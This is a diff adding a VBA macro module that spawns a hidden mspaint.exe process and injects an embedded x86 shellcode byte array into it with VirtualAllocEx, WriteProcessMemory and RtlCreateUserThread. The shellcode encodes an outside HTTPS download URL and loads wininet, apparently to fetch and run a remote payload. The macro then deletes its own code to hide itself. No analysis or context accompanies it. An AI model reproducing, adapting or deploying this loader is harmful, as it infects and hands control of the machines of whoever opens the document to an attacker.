@@ -1,0 +1,151 @@
+Option Explicit
+#If VBA7 Then
+    Private Declare PtrSafe Function VirtualAllocEx Lib "kernel32" (ByVal hProcess As LongPtr, lpAddress As Any, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+    Private Declare PtrSafe Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As Any, lpBuffer As Any, ByVal nSize As LongPtr, lpNumberOfBytesWritten As Long) As Long
+    Private Declare PtrSafe Function CloseHandle Lib "kernel32" (ByVal hObject As LongPtr) As LongPtr
+    Private Declare PtrSafe Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessID As Long) As LongPtr
+    Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Dkhnszol As LongPtr, ByRef Wwgtgy As Any, ByVal Hrkmuos As LongPtr) As Long
+    Private Declare PtrSafe Function CreateRemoteThread Lib "kernel32" (ByVal hProcess As LongPtr, lpThreadAttributes As Any, ByVal dwStackSize As LongPtr, ByVal lpStartAddress As LongPtr, lpParameter As Any, ByVal dwCreationFlags As LongPtr, lpThreadID As Long) As Long
+    Private Declare PtrSafe Function GlobalAlloc Lib "kernel32" (ByVal wFlags As LongPtr, ByVal dwBytes As LongPtr) As LongPtr
+    Private Declare PtrSafe Function GlobalFree Lib "kernel32" (ByVal hMem As LongPtr) As LongPtr
+    Private Declare PtrSafe Function CreateProcessA Lib "kernel32" (ByVal lpApplicationName As Long, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As Long, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As LongPtr
+    Private Declare PtrSafe Function RtlCreateUserThread Lib "ntdll.dll" (ByVal hProcess As LongPtr, ByRef ThreadSecurityDescriptor As Any, ByVal CreateSuspended As LongPtr, ByVal ZeroBits As LongPtr, ByVal MaximumStackSize As LongPtr,  ByVal CommittedStackSize As LongPtr, ByVal StartAddress As LongPtr, ByVal Parameter As LongPtr, ByRef hThread As LongPtr, ByRef ClientId As Long) as Long
+    Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Zopqv As Long, ByVal Xhxi As Long, ByVal Mqnynfb As LongPtr, Tfe As Long, ByVal Zukax As Long, Rlere As Long) As LongPtr
+    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Xwl As Long, ByVal Sstjltuas As Long, ByVal Bnyltjw As Long, ByVal Rso As Long) As LongPtr
+    Private Declare PtrSafe Function DispCallFunc Lib "OleAut32.dll" (ByVal pvInstance As LongPtr, ByVal oVft As LongPtr, ByVal cc As Long, ByVal vtReturn As Integer, ByVal cActuals As Long, ByRef prgvt As Integer, ByRef prgpvarg As LongPtr, ByRef pvargResult As Variant) As Long
+
+    Private Declare PtrSafe Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpLibFileName As String) As LongPtr
+    Private Declare PtrSafe Function GetProcAddress Lib "kernel32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
+#Else
+    Private Declare Function VirtualAllocEx Lib "kernel32" (ByVal hProcess As Long, lpAddress As Any, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+    Private Declare Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As Long, ByVal lpBaseAddress As Any, lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
+    Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
+    Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessID As Long) As Long
+    Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Dkhnszol As Long, ByRef Wwgtgy As Any, ByVal Hrkmuos As Long) As Long
+    Private Declare Function CreateRemoteThread Lib "kernel32" (ByVal hProcess As Long, lpThreadAttributes As Any, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Any, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long
+    Private Declare PtrSafe Function GlobalAlloc Lib "kernel32" (ByVal wFlags As Long, ByVal dwBytes As LongPtr) As LongPtr
+    Private Declare PtrSafe Function GlobalFree Lib "kernel32" (ByVal hMem As LongPtr) As LongPtr
+    Private Declare Function CreateProcessA Lib "kernel32" (ByVal lpApplicationName As Long, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As Long, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
+    Private Declare PtrSafe Function RtlCreateUserThread Lib "ntdll.dll" (ByVal hProcess As Long, lpSecurityDescriptor As Any, bCreateSuspended As Boolean, ByVal dwStackZeroBits As Long, ByVal dwStackReserved As Long, ByVal dwStackCommit As Long, ByVal lpStartAddress As Long, lpParameter As Any, ByVal hThread As Long, lpClientID As Long) as Long
+#End If
+Private Type STARTUPINFO
+    cb As Long
+    lpReserved As String
+    lpDesktop As String
+    lpTitle As String
+    dwX As Long
+    dwY As Long
+    dwXSize As Long
+    dwYSize As Long
+    dwXCountChars As Long
+    dwYCountChars As Long
+    dwFillAttribute As Long
+    dwFlags As Long
+    wShowWindow As Integer
+    cbReserved2 As Integer
+    lpReserved2 As Long
+    hStdInput As Long
+    hStdOutput As Long
+    hStdError As Long
+End Type
+
+Private Type PROCESS_INFORMATION
+    hProcess As LongPtr
+    hThread As LongPtr
+    dwProcessID As Long
+    dwThreadID As Long
+End Type
+
+Public hTargetProcHandle As LongPtr
+Public hThreadHandle As LongPtr
+Public dwCodeLen As Long
+Public hThread As Long
+Public TID As Long
+Public shellAddr As LongPtr
+Private Const GMEM_MOVEABLE = &H2
+Private Const GMEM_ZEROINIT = &H40
+Private Const GHND = (GMEM_MOVEABLE Or GMEM_ZEROINIT)
+Private VType(0 To 63) As Integer, VPtr(0 To 63) As LongPtr
+Const CC_STDCALL = 4
+
+Sub main()
+    Const STARTF_USESHOWWINDOW = &H1
+    Const SW_SHOW = 5
+    Const SW_Hide = 0
+    Const PROCESS_ALL_ACCESS = &H1F0FFF
+    Const MEM_COMMIT = &H1000
+    Const MEM_RESERVE = &H2000
+    Const MEM_RESET = &H8000
+    Const PAGE_EXECUTE_READWRITE = &H40
+   
+    Dim proc As PROCESS_INFORMATION
+    Dim PID As Long
+    Dim src_str As Variant
+    Dim start As STARTUPINFO
+    Dim ReturnValue As LongPtr
+    Dim ret As Long
+    Dim hThreadID As Long
+    Dim status As Long
+    start.cb = Len(start)
+    start.dwFlags = STARTF_USESHOWWINDOW
+    start.wShowWindow = SW_Hide
+    Dim hGlobalMemory As LongPtr, i As Long
+    Dim bValue As Long
+    Dim lResult As Long
+    Dim bIs64Bit As Boolean
+    Dim buffer() As Byte
+    src_str = Array(&H55,&H8B,&HEC,&H81,&HEC,&H90,&H0,&H0,&H0,&H56,&H57,&HB9,&H4C,&H77,&H26,&H7,&HE8,&H6B,&H1,&H0,&H0,&HB9,&H58,&HA4,&H53,&HE5,&H8B,&HF0,&HE8,&H5F,&H1,&H0,&H0,&H6A,&H40,&H68,&H0,&H10,&H0,&H0,&H68,&H0,&H0,&HA0,&H0,&H6A,&H0,&HFF,&HD0,&H8B,&HF8, _
+&HC7,&H85,&H70,&HFF,&HFF,&HFF,&H68,&H74,&H74,&H70,&H8D,&H45,&HF0,&HC7,&H85,&H74,&HFF,&HFF,&HFF,&H73,&H3A,&H2F,&H2F,&H50,&HC7,&H85,&H78,&HFF,&HFF,&HFF,&H64,&H6F,&H63,&H78,&HC7,&H85,&H7C,&HFF,&HFF,&HFF,&H31,&H2E,&H62,&H34,&HC7,&H45,&H80,&H61,&H2E,&H61, _
+&H70,&HC7,&H45,&H84,&H70,&H2F,&H64,&H6F,&HC7,&H45,&H88,&H77,&H6E,&H6C,&H6F,&HC7,&H45,&H8C,&H61,&H64,&H2E,&H68,&HC7,&H45,&H90,&H74,&H6D,&H6C,&H3F,&HC7,&H45,&H94,&H69,&H64,&H3D,&H38,&HC7,&H45,&H98,&H38,&H26,&H73,&H65,&HC7,&H45,&H9C,&H61,&H72,&H63,&H68, _
+&HC7,&H45,&HA0,&H3D,&H54,&H55,&H68,&HC7,&H45,&HA4,&H33,&H4D,&H30,&H78,&HC7,&H45,&HA8,&H45,&H5A,&H33,&H4E,&HC7,&H45,&HAC,&H50,&H51,&H7A,&H52,&HC7,&H45,&HB0,&H34,&H54,&H45,&H52,&HC7,&H45,&HB4,&H46,&H64,&H32,&H5A,&HC7,&H45,&HB8,&H48,&H53,&H6E,&H5A,&HC7, _
+&H45,&HBC,&H61,&H53,&H47,&H74,&HC7,&H45,&HC0,&H31,&H5A,&H45,&H64,&HC7,&H45,&HC4,&H47,&H61,&H57,&H4A,&HC7,&H45,&HC8,&H48,&H56,&H58,&H46,&HC7,&H45,&HCC,&H4C,&H61,&H7A,&H6B,&HC7,&H45,&HD0,&H77,&H59,&H55,&H64,&HC7,&H45,&HD4,&H57,&H65,&H57,&H5A,&HC7,&H45, _
+&HD8,&H49,&H65,&H47,&H6C,&HC7,&H45,&HDC,&H69,&H4D,&H6C,&H49,&HC7,&H45,&HE0,&H31,&H54,&H47,&H35,&HC7,&H45,&HE4,&H53,&H61,&H46,&H6C,&HC7,&H45,&HE8,&H74,&H65,&H47,&H77,&HC7,&H45,&HEC,&H3D,&H0,&H0,&H0,&HC7,&H45,&HF0,&H77,&H69,&H6E,&H69,&HC7,&H45,&HF4, _
+&H6E,&H65,&H74,&H2E,&HC7,&H45,&HF8,&H64,&H6C,&H6C,&H0,&HC7,&H45,&HFC,&H0,&H0,&H0,&H0,&HFF,&HD6,&H8B,&HD7,&H8D,&H8D,&H70,&HFF,&HFF,&HFF,&HE8,&H22,&H1,&H0,&H0,&H85,&HC0,&H74,&H25,&H80,&H3F,&H3C,&H75,&H1E,&H80,&H7F,&H1,&H3F,&H75,&H18,&H80,&H7F, _
+&H2,&H78,&H75,&H12,&H80,&H7F,&H3,&H6D,&H75,&HC,&H80,&H7F,&H4,&H6C,&H75,&H6,&H80,&H7F,&H5,&H20,&H74,&H2,&HFF,&HD7,&H5F,&H5E,&H8B,&HE5,&H5D,&HC3,&HCC,&HCC,&HCC,&H55,&H8B,&HEC,&H83,&HEC,&H10,&H64,&HA1,&H30,&H0,&H0,&H0,&H53,&H89,&H4D,&HF0,&H56, _
+&H8B,&H40,&HC,&H57,&H8B,&H48,&HC,&H8B,&H79,&H18,&H89,&H7D,&HFC,&H85,&HFF,&HF,&H84,&H9C,&H0,&H0,&H0,&H8B,&H47,&H3C,&H33,&HF6,&H8B,&H51,&H2C,&H8B,&H59,&H30,&H8B,&H9,&H8B,&H44,&H38,&H78,&H89,&H45,&HF4,&H89,&H4D,&HF8,&H85,&HC0,&H74,&H73,&HC1,&HEA, _
+&H10,&H33,&HC9,&H85,&HD2,&H74,&H20,&H66,&HF,&H1F,&H44,&H0,&H0,&H8A,&H4,&HB,&HC1,&HCE,&HD,&H3C,&H61,&HF,&HBE,&HC0,&H7C,&H3,&H83,&HC6,&HE0,&H41,&H3,&HF0,&H3B,&HCA,&H72,&HE9,&H8B,&H45,&HF4,&H8B,&H5C,&H38,&H20,&H3,&HC7,&H3,&HDF,&H89,&H45,&HF4, _
+&H33,&HFF,&H39,&H78,&H18,&H76,&H35,&HF,&H1F,&H40,&H0,&H8B,&H13,&H8D,&H5B,&H4,&H33,&HC0,&H3,&H55,&HFC,&H66,&HF,&H1F,&H44,&H0,&H0,&HF,&HBE,&HA,&H8D,&H52,&H1,&HC1,&HC8,&HD,&H3,&HC1,&H80,&H7A,&HFF,&H0,&H75,&HEF,&H3,&HC6,&H3B,&H45,&HF0,&H74, _
+&H23,&H8B,&H45,&HF4,&H47,&H3B,&H78,&H18,&H72,&HCF,&H8B,&H4D,&HF8,&H8B,&H79,&H18,&H89,&H7D,&HFC,&H85,&HFF,&HF,&H85,&H64,&HFF,&HFF,&HFF,&H5F,&H5E,&H33,&HC0,&H5B,&H8B,&HE5,&H5D,&HC3,&H8B,&H5D,&HF4,&H8B,&H55,&HFC,&H8B,&H43,&H24,&H8D,&H4,&H78,&HF,&HB7, _
+&HC,&H10,&H8B,&H43,&H1C,&H5F,&H5E,&H5B,&H8D,&H4,&H88,&H8B,&H4,&H10,&H3,&HC2,&H8B,&HE5,&H5D,&HC3,&HCC,&HCC,&HCC,&H55,&H8B,&HEC,&H83,&HEC,&H28,&H53,&H56,&H57,&H89,&H4D,&HF0,&H33,&HFF,&HB9,&H3A,&H56,&H79,&HA7,&H89,&H55,&HE4,&H89,&H7D,&HFC,&HC7,&H45, _
+&HD8,&H4D,&H79,&H41,&H67,&HC7,&H45,&HDC,&H65,&H6E,&H74,&H0,&HE8,&HE4,&HFE,&HFF,&HFF,&H8B,&HD8,&HB9,&H77,&H87,&H7A,&HF0,&H89,&H5D,&HE8,&HE8,&HD5,&HFE,&HFF,&HFF,&HB9,&H12,&H96,&H89,&HE2,&H89,&H45,&HEC,&HE8,&HC8,&HFE,&HFF,&HFF,&HB9,&HD3,&H6B,&H6E,&HD4, _
+&H89,&H45,&HE0,&HE8,&HBB,&HFE,&HFF,&HFF,&H57,&H57,&H57,&H89,&H45,&HF8,&H8D,&H45,&HD8,&H57,&H50,&HFF,&HD3,&H8B,&HF0,&H89,&H75,&HF4,&H85,&HF6,&H74,&H35,&HF,&H1F,&H44,&H0,&H0,&H6A,&H0,&H68,&H0,&H0,&H0,&H84,&H6A,&H0,&H6A,&H0,&HFF,&H75,&HF0,&H56, _
+&HFF,&H55,&HEC,&H8B,&HD8,&H85,&HDB,&H75,&H21,&H56,&HFF,&H55,&HF8,&H53,&H53,&H53,&H53,&H8D,&H45,&HD8,&H50,&HFF,&H55,&HE8,&H8B,&HF0,&H89,&H45,&HF4,&H85,&HF6,&H75,&HD0,&H5F,&H5E,&H33,&HC0,&H5B,&H8B,&HE5,&H5D,&HC3,&H8B,&H75,&HE4,&HF,&H1F,&H40,&H0,&H8D, _
+&H45,&HFC,&H50,&H68,&HD0,&H7,&H0,&H0,&H8D,&H4,&H37,&H50,&H53,&HFF,&H55,&HE0,&H8B,&H4D,&HFC,&H3,&HF9,&H85,&HC9,&H75,&HE6,&H53,&H8B,&H5D,&HF8,&HFF,&HD3,&H8B,&H75,&HF4,&H56,&HFF,&HD3,&H8B,&HC7,&H5F,&H5E,&H5B,&H8B,&HE5,&H5D,&HC3,&HCC)
+
+    ReDim buffer(UBound(src_str) + 1) As Byte
+    #If Win64 Then
+        Dim FSO As Object
+        Set FSO = CreateObject("Scripting.FileSystemObject")
+        Dim windowsDir As String
+        windowsDir = FSO.GetSpecialFolder(0)
+        windowsDir = windowsDir & "/SysWOW64/mspaint.exe"
+        ReturnValue = CreateProcessA(0, windowsDir, 0, 0, False, 0, 0, 0, start, proc)
+    #Else
+        ReturnValue = CreateProcessA(0, "mspaint.exe", 0, 0, False, 0, 0, 0, start, proc)
+    #End If
+
+    PID = proc.dwProcessID
+    If PID Then hTargetProcHandle = OpenProcess(PROCESS_ALL_ACCESS, False, PID) Else Exit Sub
+    dwCodeLen = &H800
+    shellAddr = VirtualAllocEx(hTargetProcHandle, ByVal 0, dwCodeLen, &H3000, PAGE_EXECUTE_READWRITE)
+    For i = LBound(src_str) To UBound(src_str)
+       buffer(i) = src_str(i)
+    Next i
+
+    Dim resultWriteProcess
+    resultWriteProcess = WriteProcessMemory(hTargetProcHandle, shellAddr, buffer(0), UBound(src_str) + 1, ret)
+
+    status = RtlCreateUserThread(hTargetProcHandle, ByVal 0&, 0, 0, 0, 0, shellAddr, 0, hThreadHandle, TID)
+
+    Application.DisplayAlerts = False
+    With ThisDocument.VBProject.VBComponents
+        .Remove .Item("Module1")
+    End With
+    
+    Dim countOfLines As Integer
+    countOfLines = ThisDocument.VBProject.VBComponents.Item("ThisDocument").CodeModule.countOfLines
+
+    ThisDocument.VBProject.VBComponents.Item("ThisDocument").CodeModule.DeleteLines _
+        startline:=1, Count:=countOfLines
+End Sub
+
